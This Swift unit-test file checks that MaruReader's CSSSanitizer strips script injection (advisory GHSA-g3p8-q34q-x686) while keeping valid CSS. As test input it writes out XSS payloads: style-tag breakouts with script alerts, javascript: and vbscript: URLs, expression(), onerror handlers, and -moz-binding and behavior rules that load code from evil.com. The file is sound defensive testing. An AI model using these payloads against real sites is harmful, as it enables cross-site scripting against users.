// CSSSanitizerTests.swift
// MaruReader
// Copyright (c) 2025  Sam Smoker
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

import Foundation
@testable import MaruReaderCore
import Testing

/// Tests for CSSSanitizer to prevent script injection attacks (GHSA-g3p8-q34q-x686).
struct CSSSanitizerTests {
    // MARK: - Valid CSS Preservation

    @Test func sanitize_preservesValidCSS() {
        let css = """
        span[data-sc-content="registered-symbol"] {
            vertical-align: super;
            font-size: 0.6em;
        }

        div[data-sc-content="attribution"] {
            font-size: 0.7em;
            text-align: right;
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(sanitized.contains("vertical-align: super"))
        #expect(sanitized.contains("font-size: 0.6em"))
        #expect(sanitized.contains("text-align: right"))
        #expect(sanitized.contains("[data-sc-content=\"registered-symbol\"]"))
    }

    @Test func sanitize_preservesDataImageURLs() {
        let css = """
        .icon {
            background-image: url(data:image/png;base64,iVBORw0KGgo=);
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(sanitized.contains("data:image/png;base64"))
    }

    // MARK: - Script Injection Prevention (GHSA-g3p8-q34q-x686)

    @Test func sanitize_removesStyleClosingTag() {
        let css = """
        span { color: red; }
        </style>
        <script>alert("xss")</script>
        <style>
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.contains("</style>"))
        #expect(!sanitized.contains("<script>"))
        #expect(!sanitized.contains("alert"))
        #expect(sanitized.contains("span { color: red; }"))
    }

    @Test func sanitize_removesStyleClosingTagCaseInsensitive() {
        let css = """
        span { color: red; }
        </STYLE>
        <SCRIPT>alert("xss")</SCRIPT>
        <Style>
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("</style>"))
        #expect(!sanitized.lowercased().contains("<script>"))
    }

    @Test func sanitize_removesStyleClosingTagWithWhitespace() {
        let css = """
        span { color: red; }
        </ style >
        < script >alert("xss")</ script >
        < style >
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.contains("<"))
        #expect(!sanitized.contains(">"))
    }

    @Test func sanitize_removesAllHTMLTags() {
        let css = """
        span { color: red; }
        <div onclick="alert('xss')">test</div>
        <img src="x" onerror="alert('xss')">
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.contains("<div"))
        #expect(!sanitized.contains("<img"))
        #expect(!sanitized.contains("onclick"))
        #expect(!sanitized.contains("onerror"))
    }

    // MARK: - JavaScript URL Prevention

    @Test func sanitize_removesJavaScriptURLs() {
        let css = """
        .link {
            background: url(javascript:alert('xss'));
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("javascript:"))
    }

    @Test func sanitize_removesJavaScriptURLsCaseInsensitive() {
        let css = """
        .link {
            background: url(JAVASCRIPT:alert('xss'));
            cursor: url(JavaScript:void(0));
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("javascript:"))
    }

    @Test func sanitize_removesVBScriptURLs() {
        let css = """
        .link {
            background: url(vbscript:msgbox('xss'));
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("vbscript:"))
    }

    // MARK: - Legacy Attack Vector Prevention

    @Test func sanitize_removesExpressionFunction() {
        let css = """
        .element {
            width: expression(alert('xss'));
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("expression("))
        #expect(sanitized.contains("blocked("))
    }

    @Test func sanitize_removesMozBinding() {
        let css = """
        .element {
            -moz-binding: url('http://evil.com/xss.xml#xss');
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("-moz-binding:"))
    }

    @Test func sanitize_removesBehavior() {
        let css = """
        .element {
            behavior: url('http://evil.com/xss.htc');
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.lowercased().contains("behavior:"))
    }

    @Test func sanitize_blocksNonImageDataURLs() {
        let css = """
        .element {
            content: url(data:text/html,<script>alert('xss')</script>);
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.contains("data:text/html"))
    }

    // MARK: - HTML Comment Prevention

    @Test func sanitize_removesHTMLComments() {
        let css = """
        .element { color: red; }
        <!-- <script>alert('xss')</script> -->
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(!sanitized.contains("<!--"))
        #expect(!sanitized.contains("-->"))
    }

    // MARK: - Real World Malicious Payload Test

    @Test func sanitize_handlesMaliciousDictionaryPayload() {
        // This is the exact attack pattern from GHSA-g3p8-q34q-x686
        let maliciousCSS = """
        span[data-sc-content="registered-symbol"] {
            vertical-align: super;
            font-size: 0.6em;
        }

        div[data-sc-content="attribution"] {
            font-size: 0.7em;
            text-align: right;
        }

        </style>
        <script>
        alert("hello");
        </script>
        <style>
        """

        let sanitized = CSSSanitizer.sanitize(maliciousCSS)

        // Valid CSS should be preserved
        #expect(sanitized.contains("vertical-align: super"))
        #expect(sanitized.contains("font-size: 0.6em"))
        #expect(sanitized.contains("text-align: right"))

        // Attack payload should be removed
        #expect(!sanitized.contains("</style>"))
        #expect(!sanitized.contains("<script>"))
        #expect(!sanitized.contains("</script>"))
        #expect(!sanitized.contains("<style>"))
        #expect(!sanitized.contains("alert"))
    }

    // MARK: - Edge Cases

    @Test func sanitize_handlesEmptyString() {
        let sanitized = CSSSanitizer.sanitize("")
        #expect(sanitized == "")
    }

    @Test func sanitize_handlesWhitespaceOnly() {
        let sanitized = CSSSanitizer.sanitize("   \n\t  ")
        #expect(sanitized == "   \n\t  ")
    }

    @Test func sanitize_preservesCSSComments() {
        let css = """
        /* This is a CSS comment */
        .element { color: red; }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(sanitized.contains("/* This is a CSS comment */"))
    }

    @Test func sanitize_preservesAtRules() {
        let css = """
        @media (prefers-color-scheme: dark) {
            .element { color: white; }
        }
        @keyframes fade {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        """

        let sanitized = CSSSanitizer.sanitize(css)

        #expect(sanitized.contains("@media"))
        #expect(sanitized.contains("@keyframes"))
    }
}
